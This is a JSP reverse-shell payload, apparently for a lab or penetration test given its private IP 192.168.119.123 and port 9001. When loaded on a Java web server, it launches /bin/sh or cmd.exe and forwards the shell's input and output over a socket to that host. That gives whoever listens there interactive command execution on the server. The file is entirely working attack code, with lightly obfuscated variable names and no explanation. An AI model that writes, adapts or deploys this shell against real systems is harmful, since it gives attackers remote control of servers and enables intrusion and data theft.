<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream rh;
    OutputStream y3;

    StreamConnector( InputStream rh, OutputStream y3 )
    {
      this.rh = rh;
      this.y3 = y3;
    }

    public void run()
    {
      BufferedReader hR  = null;
      BufferedWriter orh = null;
      try
      {
        hR  = new BufferedReader( new InputStreamReader( this.rh ) );
        orh = new BufferedWriter( new OutputStreamWriter( this.y3 ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = hR.read( buffer, 0, buffer.length ) ) > 0 )
        {
          orh.write( buffer, 0, length );
          orh.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( hR != null )
          hR.close();
        if( orh != null )
          orh.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.119.123", 9001 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
